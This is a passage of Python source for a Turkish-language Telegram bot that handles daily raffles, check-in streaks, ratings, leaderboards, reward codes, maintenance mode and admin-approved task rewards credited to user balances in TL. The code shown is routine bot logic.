          bot.send_message(uid, f"📢 **JACKPOT VURULDU!**{night_tag}\nBir kullanıcı **{win:.2f} TL** jackpot kazandı!", parse_mode="Markdown")
        except:
          pass
    return True
  return False

def _cekilis_channel():
  return _drop_target_chat()

def _cekilis_status_text():
  dc = daily_cekilis or {}
  prize = float(dc.get("prize") or 0)
  ents = list(dc.get("entrants") or [])
  need = max(0, CEKILIS_MIN_PLAYERS - len(ents))
  sub_txt = ""
  if dc.get("give_sub", CEKILIS_GIVE_SUB):
    sub_txt = f"\n💎 Kazanan ekstra: **{CEKILIS_SUB_PLAN} checker aboneliği**"
  if not dc.get("active"):
    return "🎁 Günlük kanal çekilişi şu an kapalı."
  # Katılanları net göster (son 20 ID)
  if ents:
    show = ents[-20:]
    start_i = max(1, len(ents) - len(show) + 1)
    lines = [f"{i}. `{uid}`" for i, uid in enumerate(show, start=start_i)]
    more = f"\n… +{len(ents) - 20} kişi daha" if len(ents) > 20 else ""
    entrants_block = "\n".join(lines) + more
  else:
    entrants_block = "_Henüz kimse katılmadı._"
  return (
    f"🎁 **GÜNLÜK KANAL ÇEKİLİŞİ**\n\n"
    f"💰 Ödül: **{prize:.0f} TL**\n"
    f"👥 Katılan: **{len(ents)}/{CEKILIS_MIN_PLAYERS}**\n"
    f"⏳ Kalan: **{need}** kişi\n"
    f"⚠️ **{CEKILIS_MIN_PLAYERS} kişi dolmadan çekiliş açıklanmaz!**"
    f"{sub_txt}\n\n"
    f"📋 **Katılımcılar:**\n{entrants_block}\n\n"
    f"Aşağıdaki **✅ Katıl** butonuna bas — bot açmana gerek yok."
  )

def start_daily_cekilis(force_new=False):
  """Bot açılınca veya yeni gün: 500–2000 TL random çekiliş başlat, kanala duyur."""
  global daily_cekilis
  today = datetime.now().strftime("%Y-%m-%d")
  dc = daily_cekilis if isinstance(daily_cekilis, dict) else {}
  if not force_new and dc.get("active") and dc.get("day") == today and not dc.get("winner"):
    # aynı gün aktif çekiliş var — sadece hatırlat
    try:
      post_cekilis_to_channel(remind=True)
    except Exception as e:
      log_error("start_daily_cekilis_reuse", e)
    return dc
  prize = float(random.randint(int(CEKILIS_MIN_PRIZE), int(CEKILIS_MAX_PRIZE)))
  daily_cekilis = {
    "active": True,
    "prize": prize,
    "entrants": [],
    "started_at": time.time(),
    "day": today,
    "channel_msg_id": None,
    "last_remind": 0.0,
    "winner": None,
    "give_sub": bool(CEKILIS_GIVE_SUB),
  }
  try:
    save_data()
  except Exception:
    pass
  try:
    post_cekilis_to_channel(remind=False, force_new=True)
  except Exception as e:
    log_error("start_daily_cekilis_post", e)
  # Bota (tüm kayıtlılara) kısa duyuru
  try:
    text = (
      f"🎁 **Çekiliş başladı!**\n\n"
      f"💰 Ödül: **{prize:.0f} TL**\n"
      f"👥 Hedef: **{CEKILIS_MIN_PLAYERS}** kişi\n"
      f"📢 Kanala da duyuruldu.\n\n"
      f"Katıl → Ana Menü / Sosyal → Çekiliş"
    )
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Çekilişe Katıl", callback_data="daily_cekilis_join"))
    # spam olmasın diye sadece adminlere + isteğe bağlı sınırlı
    for aid in list(admin_ids_set)[:5]:
      try:
        bot.send_message(aid, text, reply_markup=markup, parse_mode="Markdown")
      except Exception:
        pass
  except Exception as e:
    log_error("start_daily_cekilis_bot_announce", e)
  print(f"🎁 Günlük çekiliş başladı: {prize:.0f} TL | min {CEKILIS_MIN_PLAYERS} kişi")
  return daily_cekilis

def post_cekilis_to_channel(remind=False, force_new=False):
  """Kanala çekiliş durumu. Mümkünse mevcut mesajı düzenler (spam yok).
  Kanalda ✅ Katıl = callback ile doğrudan katılım (bot menüsüne gerek yok)."""
  chat = _cekilis_channel()
  if not chat:
    return
  dc = daily_cekilis or {}
  if not dc.get("active"):
    return
  body = _cekilis_status_text()
  if remind:
    text = "🔔 **Çekiliş güncelleme**\n\n" + body
  else:
    text = "🚀 **Yeni çekiliş açıldı!**\n\n" + body
  markup = types.InlineKeyboardMarkup()
  # Doğrudan katıl — kanaldan callback
  markup.add(types.InlineKeyboardButton("✅ Katıl", callback_data="daily_cekilis_join"))
  try:
    tag = _bot_tag()
    uname = str(tag or "").lstrip("@").strip()
    if uname:
      # Yedek: bot hiç açılmamışsa deep-link ile de katılabilir
      markup.add(types.InlineKeyboardButton("🔗 Bot ile katıl", url=f"https://t.me/{uname}?start=cekilis"))
  except Exception:
    pass
  msg_id = dc.get("channel_msg_id")
  if msg_id and not force_new:
    try:
      bot.edit_message_text(
        text, chat, int(msg_id),
        reply_markup=markup, parse_mode="Markdown",
      )
      daily_cekilis["last_remind"] = time.time()
      try:
        save_data()
      except Exception:
        pass
      return
    except Exception as e:
      log_error("post_cekilis_edit", e)
  try:
    msg = bot.send_message(chat, text, reply_markup=markup, parse_mode="Markdown")
    if msg and getattr(msg, "message_id", None):
      daily_cekilis["channel_msg_id"] = msg.message_id
      daily_cekilis["last_remind"] = time.time()
      try:
        save_data()
      except Exception:
        pass
  except Exception as e:
    log_error("post_cekilis_to_channel", e)

def join_daily_cekilis(user_id):
  global daily_cekilis
  dc = daily_cekilis if isinstance(daily_cekilis, dict) else {}
  if not dc.get("active") or dc.get("winner"):
    return False, "Aktif çekiliş yok."
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  ents = list(dc.get("entrants") or [])
  if uid in ents:
    return False, f"Zaten katıldın. ({len(ents)}/{CEKILIS_MIN_PLAYERS})"
  ents.append(uid)
  daily_cekilis["entrants"] = ents
  try:
    save_data()
  except Exception:
    pass
  # Kanal mesajını güncelle (edit) — katılanlar net görünsün
  try:
    post_cekilis_to_channel(remind=True)
  except Exception as e:
    log_error("cekilis_join_refresh", e)
  msg = f"✅ Katıldın! **{len(ents)}/{CEKILIS_MIN_PLAYERS}**"
  if len(ents) >= CEKILIS_MIN_PLAYERS:
    winner_msg = draw_daily_cekilis()
    return True, msg + "\n\n" + (winner_msg or "Çekiliş sonuçlanıyor...")
  need = CEKILIS_MIN_PLAYERS - len(ents)
  return True, msg + f"\n⏳ Açıklama için **{need}** kişi daha."

def draw_daily_cekilis(force=False):
  """Çekilişi sonuçlandır. force=True → admin min kişi beklemeden açıklar (en az 1 katılımcı)."""
  global daily_cekilis
  dc = daily_cekilis if isinstance(daily_cekilis, dict) else {}
  ents = list(dc.get("entrants") or [])
  if not ents:
    return "❌ Katılımcı yok, açıklanamaz."
  if not force and len(ents) < CEKILIS_MIN_PLAYERS:
    return None
  if dc.get("winner"):
    return "Çekiliş zaten sonuçlandı."
  winner = random.choice(ents)
  prize = float(dc.get("prize") or 0)
  daily_cekilis["winner"] = winner
  daily_cekilis["active"] = False
  try:
    add_norm_bal(winner, prize)
  except Exception:
    user_balances[winner] = float(user_balances.get(winner, 0) or 0) + prize
  sub_note = ""
  if dc.get("give_sub", CEKILIS_GIVE_SUB):
    try:
      ok, smsg = grant_checker_sub(winner, CEKILIS_SUB_PLAN, via="daily_cekilis")
      if ok:
        sub_note = f"\n💎 Bonus: **{CEKILIS_SUB_PLAN}** checker aboneliği"
      else:
        sub_note = f"\nℹ️ Abonelik: {smsg}"
    except Exception as e:
      log_error("cekilis_sub", e)
  try:
    save_data()
  except Exception:
    pass
  wname = str(winner)
  try:
    u = bot.get_chat(winner)
    wname = u.first_name or wname
    if u.username:
      wname = f"{wname} (@{u.username})"
  except Exception:
    pass
  result = (
    f"🏆 **ÇEKİLİŞ SONUCU**\n\n"
    f"💰 Ödül: **{prize:.0f} TL**\n"
    f"👥 Katılım: **{len(ents)}** kişi\n"
    f"🎉 Kazanan: **{wname}** (`{winner}`)"
    f"{sub_note}"
  )
  chat = _cekilis_channel()
  if chat:
    try:
      bot.send_message(chat, result, parse_mode="Markdown")
    except Exception as e:
      log_error("cekilis_channel_result", e)
  try:
    bot.send_message(
      winner,
      f"🎉 **Çekilişi kazandın!**\n\n💰 **+{prize:.0f} TL** bakiyene eklendi.{sub_note}",
      parse_mode="Markdown",
    )
  except Exception:
    pass
  for aid in list(admin_ids_set)[:8]:
    try:
      bot.send_message(aid, result, parse_mode="Markdown")
    except Exception:
      pass
  return result

def cekilis_remind_loop():
  """Her CEKILIS_REMIND_SEC saniyede mesajı güncelle (edit); gün değişince yeni çekiliş."""
  time.sleep(8)
  try:
    start_daily_cekilis(force_new=False)
  except Exception as e:
    log_error("cekilis_boot", e)
  while True:
    try:
      today = datetime.now().strftime("%Y-%m-%d")
      dc = daily_cekilis or {}
      if (not dc.get("active")) or (dc.get("day") != today) or dc.get("winner"):
        # yeni gün veya bitti → yeni başlat
        if dc.get("day") != today or not dc.get("active"):
          start_daily_cekilis(force_new=True)
      elif dc.get("active") and not dc.get("winner"):
        last = float(dc.get("last_remind") or 0)
        if time.time() - last >= CEKILIS_REMIND_SEC:
          post_cekilis_to_channel(remind=True)
    except Exception as e:
      log_error("cekilis_remind_loop", e)
    time.sleep(30)

def claim_daily_bonus(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  if daily_bonus_claims.get(user_id) == today:
    return False, 0.0
  daily_bonus_claims[user_id] = today
  user_balances[user_id] = user_balances.get(user_id, 0.0) + DAILY_BONUS_AMOUNT
  save_data()
  return True, DAILY_BONUS_AMOUNT

def get_bot_rating_stats():
  """Ortalama puan ve dağılım."""
  if not bot_ratings:
    return 0.0, 0, {1: 0, 2: 0, 3: 0, 4: 0, 5: 0}
  dist = {1: 0, 2: 0, 3: 0, 4: 0, 5: 0}
  total = 0
  n = 0
  for v in bot_ratings.values():
    try:
      s = int((v or {}).get("stars") or 0)
    except Exception:
      continue
    if 1 <= s <= 5:
      dist[s] = dist.get(s, 0) + 1
      total += s
      n += 1
  avg = (total / n) if n else 0.0
  return avg, n, dist

def bot_rating_summary_text():
  avg, n, dist = get_bot_rating_stats()
  if n <= 0:
    return "⭐ **Bot Puanı**\n\nHenüz puan yok. İlk puanı sen ver!"
  stars_bar = "★" * max(0, min(5, int(round(avg)))) + "☆" * max(0, 5 - max(0, min(5, int(round(avg)))))
  lines = [
    "⭐ **Bot Puanı**",
    "",
    f"Ortalama: **{avg:.2f} / 5**  {stars_bar}",
    f"Toplam oy: **{n}**",
    "",
    f"5⭐: {dist.get(5, 0)}  ·  4⭐: {dist.get(4, 0)}  ·  3⭐: {dist.get(3, 0)}",
    f"2⭐: {dist.get(2, 0)}  ·  1⭐: {dist.get(1, 0)}",
    "",
    "ℹ️ 1–2⭐ → açıklama zorunlu | 3–5⭐ → açıklama isteğe bağlı",
  ]
  return "\n".join(lines)

def bot_rating_reviews_text(limit=25, offset=0):
  """Herkese açık puan + yorum listesi (yeniden eskiye)."""
  items = []
  for uid, v in (bot_ratings or {}).items():
    if not isinstance(v, dict):
      continue
    try:
      stars = int(v.get("stars") or 0)
    except Exception:
      continue
    if stars < 1 or stars > 5:
      continue
    comment = (v.get("comment") or "").strip()
    tstr = (v.get("time") or "")
    items.append((tstr, int(uid) if str(uid).lstrip("-").isdigit() else uid, stars, comment))
  items.sort(key=lambda x: x[0], reverse=True)
  total = len(items)
  chunk = items[offset:offset + limit]
  avg, n, _ = get_bot_rating_stats()
  lines = [
    "💬 **Puanlar & Yorumlar**",
    f"Ortalama **{avg:.2f}/5** · **{n}** oy",
    "—",
  ]
  if not chunk:
    lines.append("_Henüz yorum yok._")
    return "\n".join(lines), total
  for tstr, uid, stars, comment in chunk:
    star_s = "⭐" * stars
    try:
      uid_s = str(uid)
      shown = uid_s[:3] + "***" + uid_s[-2:] if len(uid_s) > 5 else uid_s
    except Exception:
      shown = "?"
    if comment:
      lines.append(f"{star_s} `{shown}`\n_{comment[:180]}_\n📅 {tstr}")
    else:
      lines.append(f"{star_s} `{shown}` _(yorum yok)_\n📅 {tstr}")
    lines.append("")
  return "\n".join(lines).strip()[:3900], total

def user_has_rated_bot(user_id):
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  return uid in bot_ratings or str(uid) in bot_ratings

def submit_bot_rating(user_id, stars, comment=""):
  """Tek seferlik puan. (ok, msg)"""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  if user_has_rated_bot(uid):
    prev = bot_ratings.get(uid) or bot_ratings.get(str(uid)) or {}
    return False, f"Zaten puan verdin: **{int(prev.get('stars', 0))}⭐**"
  try:
    stars = int(stars)
  except Exception:
    return False, "Geçersiz puan."
  if stars < 1 or stars > 5:
    return False, "Puan 1–5 arasında olmalı."
  comment = (comment or "").strip()
  low_max = int(globals().get("BOT_RATE_LOW_MAX", 2) or 2)
  if stars <= low_max:
    if len(comment) < 5:
      return False, f"❌ **{stars}⭐** için en az 5 karakter açıklama zorunlu."
  bot_ratings[uid] = {
    "stars": stars,
    "time": get_current_time_str(),
    "comment": comment[:300],
  }
  try:
    save_data()
  except Exception:
    pass
  try:
    log_activity("bot_rate", uid, f"{stars}star")
  except Exception:
    pass
  avg, n, _ = get_bot_rating_stats()
  cnote = f"\n💬 _{comment[:120]}_" if comment else ""
  return True, f"✅ Teşekkürler! **{stars}⭐** kaydedildi.{cnote}\n📊 Yeni ortalama: **{avg:.2f}** ({n} oy)"

def _ensure_activity_week():
  """Pazartesi reset haftalik skor."""
  global activity_week_start, user_activity_week, referral_week_stats, referral_week_start
  today = datetime.now().date()
  week_start = today - timedelta(days=today.weekday())
  key = week_start.isoformat()
  if activity_week_start != key:
    user_activity_week = {}
    activity_week_start = key
  if referral_week_start != key:
    referral_week_stats = {}
    referral_week_start = key

def bump_activity(user_id, points=1):
  try:
    _ensure_activity_week()
    uid = int(user_id)
    user_activity_week[uid] = int(user_activity_week.get(uid) or 0) + int(points)
  except Exception:
    pass

def get_weekly_activity_top(n=10):
  _ensure_activity_week()
  return sorted(user_activity_week.items(), key=lambda x: int(x[1] or 0), reverse=True)[:n]

def get_weekly_referral_top(n=10):
  _ensure_activity_week()
  return sorted(referral_week_stats.items(), key=lambda x: int(x[1] or 0), reverse=True)[:n]

def touch_presence(user_id):
  """Kullanıcıyı canlı aktif listesine yaz."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  try:
    online_presence[uid] = time.time()
  except Exception:
    pass

def get_online_count(window_sec=None):
  """Son N saniyede dokunan kullanıcı sayısı."""
  if window_sec is None:
    window_sec = int(globals().get("ONLINE_WINDOW_SEC", 900) or 900)
  now = time.time()
  n = 0
  dead = []
  for uid, ts in list((online_presence or {}).items()):
    try:
      if now - float(ts) <= window_sec:
        n += 1
      else:
        dead.append(uid)
    except Exception:
      dead.append(uid)
  for uid in dead:
    try:
      online_presence.pop(uid, None)
    except Exception:
      pass
  return n

def has_checked_in_today(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  return daily_checkin_claims.get(uid) == today or daily_checkin_claims.get(str(uid)) == today

def get_checkin_streak(user_id):
  data = login_streaks.get(user_id) or {}
  try:
    if not data:
      data = login_streaks.get(int(user_id), {}) or {}
  except Exception:
    pass
  if not isinstance(data, dict):
    return 0
  return int(data.get("count") or 0)

def claim_daily_checkin(user_id):
  """Günlük check-in (1 kez). Seri + TL + aktiflik puanı."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  today = datetime.now().strftime("%Y-%m-%d")
  if has_checked_in_today(uid):
    streak = get_checkin_streak(uid)
    return False, f"Bugün zaten check-in yaptın.\n🔥 Seri: **{streak}** gün", 0.0, streak
  streak_reward = 0.0
  streak = get_checkin_streak(uid)
  try:
    streak, streak_reward = update_login_streak(uid)
    streak = int(streak or get_checkin_streak(uid) or 1)
    streak_reward = float(streak_reward or 0)
  except Exception as e:
    try:
      log_error("checkin_streak", e)
    except Exception:
      pass
    yesterday = (datetime.now() - timedelta(days=1)).strftime("%Y-%m-%d")
    data = login_streaks.get(uid, {"last_date": None, "count": 0})
    if not isinstance(data, dict):
      data = {"last_date": None, "count": 0}
    if data.get("last_date") != today:
      if data.get("last_date") == yesterday:
        data["count"] = int(data.get("count") or 0) + 1
      else:
        data["count"] = 1
      data["last_date"] = today
      login_streaks[uid] = data
    streak = int(data.get("count") or 1)
    streak_reward = 0.0
  daily_checkin_claims[uid] = today
  reward = float(globals().get("CHECKIN_REWARD", 2.0) or 2.0)
  extra = 0.0
  extra_map = globals().get("CHECKIN_STREAK_BONUS") or {}
  if streak in extra_map and streak_reward <= 0:
    extra = float(extra_map[streak])
  total = reward + streak_reward + extra
  try:
    user_balances[uid] = float(user_balances.get(uid, 0.0) or 0.0) + total
    add_balance_history(uid, "checkin", total, f"seri={streak}")
  except Exception:
    pass
  try:
    bump_activity(uid, 8)
  except Exception:
    pass
  try:
    save_data()
  except Exception:
    pass
  try:
    log_activity("checkin", uid, f"streak={streak}+{total}")
  except Exception:
    pass
  msg = (
    f"✅ **Check-in tamam!**\n"
    f"🔥 Seri: **{streak}** gün\n"
    f"💵 **+{total:.0f} TL**"
  )
  if streak in (3, 7, 14, 30):
    msg += f"\n🏆 Seri kilometre taşı: **{streak} gün!**"
  return True, msg, total, streak

def create_group_code(code, reward, max_uses=100, note=""):
  code = str(code or "").strip().upper().replace(" ", "")
  if not code or len(code) < 3:
    return False, "Kod en az 3 karakter"
  try:
    reward = float(reward)
  except Exception:
    return False, "Odul sayi olmali"
  if reward <= 0:
    return False, "Odul > 0"
  group_claim_codes[code] = {
    "reward": reward,
    "max_uses": int(max_uses),
    "uses": 0,
    "claimed": [],
    "note": str(note or "")[:80],
    "created": get_current_time_str(),
  }
  save_data()
  return True, code

def claim_group_code(user_id, code):
  code = str(code or "").strip().upper().replace(" ", "")
  meta = group_claim_codes.get(code)
  if not meta:
    return False, "Kod gecersiz veya suresi dolmus"
  claimed = list(meta.get("claimed") or [])
  if int(user_id) in [int(x) for x in claimed]:
    return False, "Bu kodu zaten kullandin"
  if int(meta.get("uses") or 0) >= int(meta.get("max_uses") or 0):
    return False, "Kod tukendi"
  reward = float(meta.get("reward") or 0)
  meta["uses"] = int(meta.get("uses") or 0) + 1
  claimed.append(int(user_id))
  meta["claimed"] = claimed
  user_balances[user_id] = float(user_balances.get(user_id) or 0) + reward
  try:
    add_balance_history(user_id, "group_code", reward, code)
  except Exception:
    pass
  bump_activity(user_id, 3)
  save_data()
  return True, reward

def engagement_hub_text(user_id):
  today = datetime.now().strftime("%Y-%m-%d")
  streak_data = login_streaks.get(user_id) or login_streaks.get(int(user_id) if str(user_id).isdigit() else user_id) or {}
  if not isinstance(streak_data, dict):
    streak_data = {"count": 0, "last_date": None}
  streak = int(streak_data.get("count") or 0)
  daily_ok = daily_bonus_claims.get(user_id) != today
  checked = has_checked_in_today(user_id)
  online = get_online_count()
  my_score = 0
  try:
    _ensure_activity_week()
    my_score = int(user_activity_week.get(int(user_id), 0) or user_activity_week.get(user_id, 0) or 0)
  except Exception:
    pass
  q = daily_quests.get(user_id, {})
  if q.get("date") != today:
    q = {"date": today, "slot": 0, "ilan": 0, "checker": 0, "claimed": False}
  lines = [
    "🎯 **Aktiflik Merkezi**",
    "",
    f"🟢 Şu an aktif: **{online}** kişi",
    f"🔥 Seri: **{streak}** gün" + (f" (son: {streak_data.get('last_date')})" if streak_data.get("last_date") else ""),
    f"✅ Check-in: {'yapıldı' if checked else 'henüz yok — butona bas!'}",
    f"📊 Bu hafta puanın: **{my_score}**",
    f"🎁 Günlük bonus: {'✅ alındı' if not daily_ok else '⏳ alınabilir'}",
    f"📋 Görev: checker **{int(q.get('checker') or 0)}/3** · slot **{int(q.get('slot') or 0)}/3** · ilan **{int(q.get('ilan') or 0)}/1**",
    f"   Ödül: {'✅ alındı' if q.get('claimed') else ('🎁 hazır!' if check_quest_complete(user_id) else 'devam et')}",
    "",
    "_Her gün check-in = seri + TL + sıralama puanı_",
    "_Görev: 3 checker veya (3 slot + 1 ilan) → +10 TL_",
  ]
  return "\n".join(lines)

def weekly_leaderboard_text(user_id=None):
  _ensure_activity_week()
  online = get_online_count()
  lines = [
    "🏆 **Haftalık Aktiflik Sıralaması**",
    f"🟢 Şu an aktif: **{online}** kişi",
    "",
    "🔥 Top 15:",
  ]
  top_a = get_weekly_activity_top(15)
  if not top_a:
    lines.append("_Henüz yok — check-in yap, ilk sen ol!_")
  else:
    for i, (uid, sc) in enumerate(top_a, 1):
      medal = {1: "🥇", 2: "🥈", 3: "🥉"}.get(i, f"{i}.")
      me = ""
      try:
        if user_id is not None and int(uid) == int(user_id):
          me = " ← sen"
      except Exception:
        pass
      lines.append(f"{medal} `{uid}` → **{sc}** puan{me}")
  if user_id is not None:
    try:
      uid = int(user_id)
      my = int(user_activity_week.get(uid, 0) or 0)
      rank = None
      ordered = get_weekly_activity_top(500)
      for i, (u, _) in enumerate(ordered, 1):
        if int(u) == uid:
          rank = i
          break
      lines.append("")
      if rank:
        lines.append(f"📍 Senin sıran: **#{rank}** · **{my}** puan")
      else:
        lines.append(f"📍 Senin puanın: **{my}** (henüz sıralamada yok)")
    except Exception:
      pass
  lines.append("")
  lines.append("📈 Puan: check-in +8 · menü/görev +1–5")
  return "\n".join(lines)

def get_tournament_top(n=10):
  return sorted(gambling_profits.items(), key=lambda x: x[1], reverse=True)[:n]

def check_maintenance_expiry():
  """Süreli bakım bittiyse otomatik kapat."""
  global maintenance_mode, maintenance_until
  if maintenance_mode and maintenance_until:
    if time.time() >= float(maintenance_until):
      maintenance_mode = False
      maintenance_until = None
      save_data()
      return True
  return False

def maintenance_remaining_str():
  """Kalan süre metni (dakika + saniye net)."""
  if not maintenance_mode:
    return "Kapalı"
  if not maintenance_until:
    return "Süresiz (manuel kapatılana kadar)"
  left = int(float(maintenance_until) - time.time())
  if left <= 0:
    return "Süre doldu (0 dk 0 sn)"
  h, r = divmod(left, 3600)
  m, s = divmod(r, 60)
  total_min = left // 60
  if h > 0:
    return f"{h} saat {m} dk {s} sn  (~{total_min} dk)"
  return f"{m} dakika {s} saniye"

def get_maintenance_block_text():
  """Kullanıcıya gösterilecek bakım mesajı + geri sayım."""
  check_maintenance_expiry()
  rem = maintenance_remaining_str()
  if maintenance_until and maintenance_mode:
    left = max(0, int(float(maintenance_until) - time.time()))
    m, s = divmod(left, 60)
    h, m = divmod(m, 60)
    if h > 0:
      countdown = f"⏳ **Kalan süre: {h} saat {m} dk {s} sn**"
    else:
      countdown = f"⏳ **Kalan süre: {m} dakika {s} saniye**"
  elif maintenance_mode:
    countdown = "⏳ **Kalan süre: Süresiz** (admin kapatana kadar)"
  else:
    countdown = ""
  return (
    f"🔧 **Bakım Modu Aktif!**\n\n"
    f"{maintenance_message}\n\n"
    f"{countdown}\n"
    f"Sadece yöneticiler erişebilir. Lütfen süre bitince tekrar deneyin."
  )

def is_maintenance_blocking(user_id):
  check_maintenance_expiry()
  return maintenance_mode and user_id not in admin_ids_set

def set_maintenance(val, until=None):
  global maintenance_mode, maintenance_until
  maintenance_mode = bool(val)
  if not maintenance_mode:
    maintenance_until = None
  else:
    maintenance_until = float(until) if until else None
  save_data()

def set_maintenance_timed(minutes):
  """Belirli dakika boyunca bakım aç."""
  minutes = max(1, int(minutes))
  until = time.time() + minutes * 60
  set_maintenance(True, until=until)
  return until

def set_jackpot(val):
  global jackpot_pool
  jackpot_pool = float(val)
  save_data()

def ensure_user(user_id, username=None, first_name=None):
  """Telegram ID ile otomatik hesap - login gerekmez. Eski bakiyeler/ban ASLA sıfırlanmaz."""
  try:
    user_id = int(user_id)
  except Exception:
    pass
  is_new = user_id not in registered_users and user_id not in user_credentials
  registered_users.add(user_id)
  if user_id not in user_balances:
    user_balances[user_id] = 0.0
  if user_id not in ref_balances:
    ref_balances[user_id] = 0.0
  if user_id not in user_gamble_balances:
    user_gamble_balances[user_id] = float(user_gamble_balances.get(user_id, 0.0) or 0.0)
  if user_id not in user_credentials:
    display = (username or first_name or str(user_id))
    user_credentials[user_id] = {
      "reg_username": str(display)[:32],
      "email": "",
      "password": "",
      "logged_in": True,
      "display_name": str(display)[:32]
    }
  else:
    user_credentials[user_id]["logged_in"] = True
    if "display_name" not in user_credentials[user_id]:
      user_credentials[user_id]["display_name"] = user_credentials[user_id].get("reg_username", str(user_id))
  if is_new:
    save_data()
  return user_credentials[user_id]

def set_maint_msg(msg):
  global maintenance_message
  maintenance_message = msg
  save_data()

def set_min_withdraw(val):
  global min_withdraw
  min_withdraw = float(val)
  save_data()

def set_withdraw_commission(val):
  global withdraw_commission
  withdraw_commission = float(val)
  save_data()

def log_activity(action, user_id, detail=""):
  global activity_logs
  activity_logs.append({
    "action": action,
    "user_id": user_id,
    "detail": str(detail)[:200],
    "time": get_current_time_str()
  })
  if len(activity_logs) > 500:
    activity_logs = activity_logs[-500:]
  save_data()

def add_balance_history(user_id, typ, amount, note=""):
  global balance_history
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  try:
    amt = float(amount)
  except Exception:
    amt = 0.0
  if uid not in balance_history:
    balance_history[uid] = []
  balance_history[uid].append({
    "type": str(typ)[:40],
    "amount": amt,
    "note": str(note)[:80] if note else "",
    "time": get_current_time_str()
  })
  balance_history[uid] = balance_history[uid][-80:]
  try:
    save_data()
  except Exception as e:
    log_error("add_balance_history_save", e)

def get_user_balance_history(user_id, limit=20):
  """Kullanıcı geçmişini güvenli getir (str/int key uyumu)."""
  try:
    uid = int(user_id)
  except Exception:
    uid = user_id
  hist = balance_history.get(uid) or balance_history.get(str(uid)) or []
  if not isinstance(hist, list):
    return []
  return hist[-limit:]

def approve_earn_claim(claim_id, by_admin=True):
  """Bekleyen görev ödülünü onayla ve bakiyeye ekle."""
  global pending_earn_claims, user_earn_claims, user_balances
  claim = pending_earn_claims.get(claim_id)
  if not claim or claim.get("status") != "pending":
    return False, "Claim yok veya işlenmiş"
  uid = int(claim["user_id"])
  tid = claim["task_id"]
  reward = float(claim.get("reward", 0))
  claimed = list(user_earn_claims.get(uid, []))
  if tid not in claimed:
    claimed.append(tid)
    user_earn_claims[uid] = claimed
  user_balances[uid] = user_balances.get(uid, 0.0) + reward
  title = ""
  try:
    title = earn_tasks.get(tid, {}).get("title", tid)
  except Exception:
    title = tid
  add_balance_history(uid, "earn_task", reward, title)
  add_xp(uid, 5)
  add_notification(uid, f"+{reward:.0f} TL görev ödülü ({'admin' if by_admin else 'otomatik'})")
  claim["status"] = "approved"
  claim["resolved_at"] = time.time()
  claim["by_admin"] = by_admin
  pending_earn_claims[claim_id] = claim
  save_data()
  try:
    bot.send_message(
      uid,
      f"✅ **Görev onaylandı!**\n\n🎯 {title}\n💵 **+{reward:.0f} TL**\n💳 Bakiye: **{user_balances[uid]:.2f} TL**",
      parse_mode="Markdown"
    )
  except Exception:
    pass
  log_activity("earn_approved", uid, f"{tid}:{reward}:{by_admin}")
  return True, "ok"

def reject_earn_claim(claim_id):
  claim = pending_earn_claims.get(claim_id)
  if not claim or claim.get("status") != "pending":
    return False
  uid = int(claim["user_id"])
  claim["status"] = "rejected"
  claim["resolved_at"] = time.time()
  pending_earn_claims[claim_id] = claim
  save_data()
  try:
    bot.send_message(uid, "❌ Görev kanıtın reddedildi. Tekrar deneyebilirsin.")
  except Exception:
    pass
  return True

def process_earn_proof(message, chat_id, user_id):
  """Kullanıcı görev kanıtı (foto) gönderdi — kaydet ve adminlere ilet."""
  tid = admin_temp_data.get(chat_id, {}).get("earn_proof_tid")
  reward = float(admin_temp_data.get(chat_id, {}).get("earn_proof_reward", 0) or 0)
  if not tid:
    bot.send_message(chat_id, "❌ Görev bilgisi kayboldu. Görevden tekrar Kanıt Gönder.")
    user_states.pop(chat_id, None)
    return
  file_id = None
  if message.photo:
    file_id = message.photo[-1].file_id
  elif message.document:
    mime = (message.document.mime_type or "").lower()
    name = (message.document.file_name or "").lower()
    if mime.startswith("image") or name.endswith((".jpg", ".jpeg", ".png", ".webp")):
      file_id = message.document.file_id
  if not file_id:
    bot.send_message(chat_id, "❌ Ekran görüntüsünü **foto** olarak gönder (dosya değilse galeriden seç).\nİptal: /iptal")
    return
  claim_id = str(uuid.uuid4())[:8]
  uname = message.from_user.username or "-"
  pending_earn_claims[claim_id] = {
    "user_id": int(user_id),
    "task_id": tid,
    "reward": reward,
    "file_id": file_id,
    "created": time.time(),
    "status": "pending",
    "username": uname,
  }
  save_data()
  user_states.pop(chat_id, None)
  admin_temp_data.pop(chat_id, None)
  title = str(earn_tasks.get(tid, {}).get("title", tid))
  try:
    bot.send_message(
      chat_id,
      f"✅ Kanıt alındı!\n\n🎯 {title}\n💵 +{reward:.0f} TL\n⏳ Admin onayı bekleniyor (max 10 dk).\n🆔 {claim_id}"
    )
  except Exception:
    pass
  caption = (
    f"📸 Görev kanıtı\n"
    f"🆔 Claim: {claim_id}\n"
    f"👤 {user_id} @{uname}\n"
    f"🎯 {title}\n"
    f"💵 +{reward:.0f} TL\n"
    f"⏰ 10 dk içinde onaylanmazsa otomatik onay"
  )
  markup = types.InlineKeyboardMarkup(row_width=2)
  markup.add(
    types.InlineKeyboardButton("✅ Onayla", callback_data=f"earn_approve_{claim_id}"),
    types.InlineKeyboardButton("❌ Reddet", callback_data=f"earn_reject_{claim_id}"),
  )
  sent_any = False
  for admin_id in list(admin_ids_set):
    try:
      bot.send_photo(admin_id, file_id, caption=caption, reply_markup=markup)
      sent_any = True
    except Exception as e:
      log_error(f"earn_proof_photo_{admin_id}", e)
      try:
        bot.send_message(admin_id, caption + f"\n(file_id={file_id})", reply_markup=markup)
        sent_any = True
      except Exception as e2:
        log_error(f"earn_proof_msg_{admin_id}", e2)
  if not sent_any:
    try:
      bot.send_message(chat_id, "⚠️ Kanıt kaydedildi ama adminlere iletilemedi. Adminler panelden görebilir.")
    except Exception:
      pass
  log_activity("earn_proof", user_id, f"{tid}:{claim_id}")

def earn_auto_approve_loop():
  """10 dk içinde admin bakmazsa otomatik onay."""
  while True:
    try:
      time.sleep(30)
      now = time.time()
